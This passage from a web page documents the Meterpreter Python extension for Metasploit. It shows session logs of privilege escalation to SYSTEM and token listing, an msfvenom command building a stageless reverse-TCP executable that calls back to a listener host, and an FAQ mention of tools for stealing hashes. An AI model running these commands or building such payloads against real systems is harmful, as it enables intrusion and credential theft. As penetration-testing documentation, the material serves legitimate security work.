9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>meterpreter.user</h4>\n<ul>\n<li><code class=\"language-text\">meterpreter.user.getuid()</code> - gets the UID of the current session.</li>\n<li><code class=\"language-text\">meterpreter.user.getsid()</code> - gets the SID of the current session.</li>\n<li><code class=\"language-text\">meterpreter.user.is_system()</code> - determines if the current session is running as the <code class=\"language-text\">SYSTEM</code> user.</li>\n</ul>\n<h3 id=\"bindings-example\" style=\"position:relative;\"><a href=\"#bindings-example\" aria-label=\"bindings example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bindings example</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: WIN-TV01I7GG7JK\\oj\nmeterpreter &gt; python_execute &quot;import meterpreter.user; print meterpreter.user.getuid()&quot;\n[+] Content written to stdout:\nWIN-TV01I7GG7JK\\oj\n\nmeterpreter &gt; python_execute &quot;import meterpreter.elevate; meterpreter.elevate.getsystem()&quot;\n[+] Command executed without returning a result\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; python_execute &quot;meterpreter.elevate.rev2self(); print meterpreter.user.getuid()&quot;\n[+] Content written to stdout:\nWIN-TV01I7GG7JK\\oj\n\nmeterpreter &gt; use incognito\nLoading extension incognito...success.\nmeterpreter &gt; python_execute &quot;import meterpreter.incognito; print meterpreter.incognito.list_user_tokens()&quot;\n[+] Content written to stdout:\n{&#39;Delegation&#39;: [&#39;NT AUTHORITY\\\\LOCAL SERVICE&#39;, &#39;NT AUTHORITY\\\\NETWORK SERVICE&#39;, &#39;NT AUTHORITY\\\\SYSTEM&#39;, &#39;WIN-TV01I7GG7JK\\\\oj&#39;], &#39;Impersonation&#39;: [&#39;NT AUTHORITY\\\\ANONYMOUS LOGON&#39;]}\n\nmeterpreter &gt; python_execute &quot;import meterpreter.fs; print meterpreter.fs.show_mount()&quot;\n[+] Content written to stdout:\n[{&#39;Name&#39;: &#39;A:\\\\&#39;, &#39;SpaceUser&#39;: None, &#39;SpaceTotal&#39;: None, &#39;UNC&#39;: None, &#39;SpaceFree&#39;: None, &#39;Type&#39;: 2}, {&#39;Name&#39;: &#39;C:\\\\&#39;, &#39;SpaceUser&#39;: 28950585344L, &#39;SpaceTotal&#39;: 64422408192L, &#39;UNC&#39;: None, &#39;SpaceFree&#39;: 28950585344L, &#39;Type&#39;: 3}, {&#39;Name&#39;: &#39;D:\\\\&#39;, &#39;SpaceUser&#39;: None, &#39;SpaceTotal&#39;: None, &#39;UNC&#39;: None, &#39;SpaceFree&#39;: None, &#39;Type&#39;: 5}]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Each of the examples above just show the results printed to stdout, however the values are returned as Python dictionaries and can be operated on just like normal variables.</p>\n<h2 id=\"stageless-initialisation\" style=\"position:relative;\"><a href=\"#stageless-initialisation\" aria-label=\"stageless initialisation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stageless Initialisation</h2>\n<p>Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$  cat /tmp/met.py\nimport meterpreter.transport\nmeterpreter.transport.add(&quot;tcp://127.0.0.1:8000&quot;)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>This is a simple script that uses the Meterpreter bindings to add a new transport to the list of transports. This is executed immediately before Meterpreter attempts to create a connection back to Metasploit for the first time. The intent is to show that it's possible to add any number of transports on startup.</p>\n<p>To create a stageless payload that uses this script, we can make use of the <code class=\"language-text\">EXTINIT</code> parameter in <code class=\"language-text\">msfvenom</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo Arch selected, selecting Arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 6412437 bytes\nSaved as: /tmp/met-stageless.exe</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>When this payload is executed, the transport is added and shown to be present in the transport list immediately:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(handler) &gt; [*] Meterpreter session 2 opened (172.16.52.1:4445 -&gt; 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000\n\nmsf exploit(handler) &gt; sessions -i -1\n[*] Starting interaction with 2...\n\nmeterpreter &gt; transport list\nSession Expiry  : @ 2015-12-20 11:06:52\n\n    ID  Curr  URL                     Comms T/O  Retry Total  Retry Wait\n    --  ----  ---                     ---------  -----------  ----------\n    1         tcp://127.0.0.1:8000    300        3600         10\n    2   *     tcp://172.16.52.1:4445  300        3600         10</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>This stageless initialisation feature allows for long-running Python scripts to be run before Meterpreter even calls home. This is really handy in so many ways, so get creative and show us how awesome this can be.</p>\n<h1 id=\"faq\" style=\"position:relative;\"><a href=\"#faq\" aria-label=\"faq permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>FAQ</h1>\n<blockquote>\n<p>Does the extension do dynamic resolution of Python libraries at runtime?</p>\n</blockquote>\n<p>Yes. The extension has a built-in import handler that loads modules from memory. This includes modules that the user has dynamically loaded using the <code class=\"language-text\">python_import</code> command. If a module doesn't exist as part of the extension then resolution will fail. Down the track we may look into extending this feature so that missing libraries are uploaded on-the-fly when an import fails, but it's not known when this work will get done.</p>\n<blockquote>\n<p>When will this extension be available for other Meterpreters?</p>\n</blockquote>\n<p>We're not yet able to put a timeline on this.</p>\n<blockquote>\n<p>Is it possible to use the Python extension to run Responder?</p>\n</blockquote>\n<p>Unfortunately, no it is not. Responder makes the assumption that port <code class=\"language-text\">445</code> is available for use on the target, which is why it functions nicely on *nix systems that don't make use of this port by default. On Windows systems, port <code class=\"language-text\">445</code> is already in use by system services and hence can't be bound to.</p>\n<p>There is a Powershell-based project that aims to do the same thing as Responder, and that is called <a href=\"https://github.com/Kevin-Robertson/Inveigh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Inveigh</a>. This utility piggy-backs of the existing SMB service, and appears to do quite a good job of stealing hashes, so it's recommended that this be used instead.</p>\n<blockquote>\n<p>Is it perfect?</p>\n</blockquote>\n<p>Hell no! But the goal is to get closer and closer to perfect as we go. It's up to you to help us improve it along the way by using it in interesting ways, and submitting bugs when it breaks.</p>\n<blockquote>\n<p>Can I suggest a feature?</p>\n</blockquote>\n<p>Please do, making good use of the Github issues feature. Better still, create a PR for one!</p>\n<h1 id=\"currently-loadable-native-libraries\" style=\"position:relative;\"><a href=\"#currently-loadable-native-libraries\" aria-label=\"currently loadable native libraries permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Currently Loadable Native Libraries</h1>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">__future__\n__phello__\n_abcoll\n_osx_support\n_pyio\n_strptime\n_threading_local\n_weakrefset\nabc\naifc\nantigravity\nargparse\nasynchat\nasyncore\natexit\naudiodev\nbase64\nBaseHTTPServer\nBastion\nbdb\nbinhex\nbisect\ncalendar\ncgi\nCGIHTTPServer\ncgitb\nchunk\ncmd\ncode\ncodecs\ncodeop\ncollections\ncolorsys\ncommands\ncompileall\ncompiler\ncompiler.ast\ncompiler.consts\ncompiler.future\ncompiler.misc\ncompiler.pyassem\ncompiler.pycodegen\ncompiler.symbols\ncompiler.syntax\ncompiler.transformer\ncompiler.visitor\nConfigParser\ncontextlib\nCookie\ncookielib\ncopy\ncopy_reg\ncProfile\ncsv\nctypes\nctypes._endian\nctypes.util\nctypes.wintypes\ndecimal\ndifflib\ndircache\ndis\nDocXMLRPCServer\ndummy_thread\ndummy_threading\nemail\nemail._parseaddr\nemail.base64mime\nemail.charset\nemail.encoders\nemail.errors\nemail.feedparser\nemail.generator\nemail.header\nemail.iterators\nemail.message\nemail.parser\nemail.quoprimime\nemail.utils\nemail.mime\nemail.mime.application\nemail.mime.audio\nemail.mime.base\nemail.mime.image\nemail.mime.message\nemail.mime.multipart\nemail.mime.nonmultipart\nemail.mime.text\nencodings\nencodings.aliases\nencodings.ascii\nencodings.base64_codec\nencodings.charmap\nencodings.cp037\nencodings.cp1006\nencodings.cp1026\nencodings.cp1140\nencodings.cp1250\nencodings.cp1251\nencodings.cp1252\nencodings.cp1253\nencodings.cp1254\nencodings.cp1255\nencodings.cp1256\nencodings.cp1257\nencodings.cp1258\nencodings.cp424\nencodings.cp437\nencodings.cp500\nencodings.cp720\nencodings.cp737\nencodings.cp775\nencodings.cp850\nencodings.cp852\nencodings.cp855\nencodings.cp856\nencodings.cp857\nencodings.cp858\nencodings.cp860\nencodings.cp861\nencodings.cp862\nencodings.cp863\nencodings.cp864\nencodings.cp865\nencodings.cp866\nencodings.cp869\nencodings.cp874\nencodings.cp875\nencodings.hex_codec\nencodings.hp_roman8\nencodings.idna\nencodings.iso8859_1\nencodings.iso8859_10\nencodings.iso8859_11\nencodings.iso8859_13\nencodings.iso8859_14\nencodings.iso8859_15\nencodings.iso8859_16\nencodings.iso8859_2\nencodings.iso8859_3\nencodings.iso8859_4\nencodings.iso8859_5\nencodings.iso8859_6\nencodings.iso8859_7\nencodings.iso8859_8\nencodings.iso8859_9\nencodings.koi8_r\nencodings.koi8_u\nencodings.latin_1\nencodings.mac_arabic\nencodings.mac_centeuro\nencodings.mac_croatian\nencodings.mac_cyrillic\nencodings.mac_farsi\nencodings.mac_greek\nencodings.mac_iceland\nencodings.mac_latin2\nencodings.mac_roman\nencodings.mac_romanian\nencodings.mac_turkish\nencodings.mbcs\nencodings.palmos\nencodings.ptcp154\nencodings.punycode\nencodings.quopri_codec\nencodings.raw_unicode_escape\nencodings.rot_13\nencodings.string_escape\nencodings.tis_620\nencodings.undefined\nencodings.unicode_escape\nencodings.unicode_internal\nencodings.utf_16\nencodings.utf_16_be\nencodings.utf_16_le\nencodings.utf_32\nencodings.utf_32_be\nencodings.utf_32_le\nencodings.utf_7\nencodings.utf_8\nencodings.utf_8_sig\nencodings.uu_codec\nencodings.zlib_codec\nfilecmp\nfileinput\nfnmatch\nformatter\nfpformat\nfractions\nftplib\nfunctools\ngenericpath\ngetopt\ngetpass\ngettext\nglob\ngzip\nhashlib\nheapq\nhmac\nhtmlentitydefs\nhtmllib\nHTMLParser\nhttplib\nihooks\nimaplib\nimghdr\nimportlib\nimputil\ninspect\nio\njson\njson.decoder\njson.encoder\njson.scanner\njson.tool\nkeyword\nlinecache\nlocale\nlogging\nlogging.config\nlogging.handlers\nmacpath\nmacurl2path\nmailbox\nmailcap\nmarkupbase\nmd5\nmeterpreter\nmeterpreter.core\nmeterpreter.elevate\nmeterpreter.fs\nmeterpreter.incognito\nmeterpreter.kiwi\nmeterpreter.sys\nmeterpreter.tlv\nmeterpreter.transport\nmeterpreter.user\nmeterpreter.extapi\nmeterpreter.extapi.adsi\nmhlib\nmimetools\nmimetypes\nMimeWriter\nmodulefinder\nmultifile\nmultiprocessing\nmultiprocessing.connection\nmultiprocessing.forking\nmultiprocessing.heap\nmultiprocessing.managers\nmultiprocessing.pool\nmultiprocessing.process\nmultiprocessing.queues\nmultiprocessing.reduction\nmultiprocessing.sharedctypes\nmultiprocessing.synchronize\nmultiprocessing.util\nmultiprocessing.dummy\nmultiprocessing.dummy.connection\nmutex\nnetrc\nnew\nnntplib\nntpath\nnturl2path\nnumbers\nopcode\noptparse\nos\nos2emxpath\npdb\npickle\npickletools\npipes\npkgutil\nplatform\nplistlib\npopen2\npoplib\nposixfile\nposixpath\npprint\nprofile\npstats\npy_compile\npyclbr\npydoc\nQueue\nquopri\nrandom\nre\nrepr\nrexec\nrfc822\nrlcompleter\nrobotparser\nrunpy\nsched\nsets\nsgmllib\nsha\nshelve\nshlex\nshutil\nSimpleHTTPServer\nSimpleXMLRPCServer\nsite\nsmtplib\nsndhdr\nsocket\nSocketServer\nsre\nsre_compile\nsre_constants\nsre_parse\nssl\nstat\nstatvfs\nstring\nStringIO\nstringold\nstringprep\nstruct\nsubprocess\nsunau\nsunaudio\nsymbol\nsymtable\nsysconfig\ntabnanny\ntarfile\ntelnetlib\ntempfile\ntextwrap\nthis\nthreading\ntimeit\ntoaiff\ntoken\ntokenize\ntrace\ntraceback\ntypes\nurllib\nurllib2\nurlparse\nuser\nUserDict\nUserList\nUserString\nuu\nuuid\nwarnings\nwave\nweakref\nwebbrowser\nwhichdb\nwsgiref\nwsgiref.handlers\nwsgiref.headers\nwsgiref.simple_server\nwsgiref.util\nwsgiref.validate\nxdrlib\nxml\nxml.dom\nxml.dom.domreg\nxml.dom.expatbuilder\nxml.dom.minicompat\nxml.dom.minidom\nxml.dom.NodeFilter\nxml.dom.pulldom\nxml.dom.xmlbuilder\nxml.etree\nxml.etree.ElementInclude\nxml.etree.ElementPath\nxml.etree.ElementTree\nxml.parsers\nxml.sax\nxml.sax._exceptions\nxml.sax.handler\nxml.sax.saxutils\nxml.sax.xmlreader\nxmllib\nxmlrpclib\nzipfile</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}},"pageContext":{"id":"bd2ad6c6-52f9-5da0-baff-548478b1eed5"}}}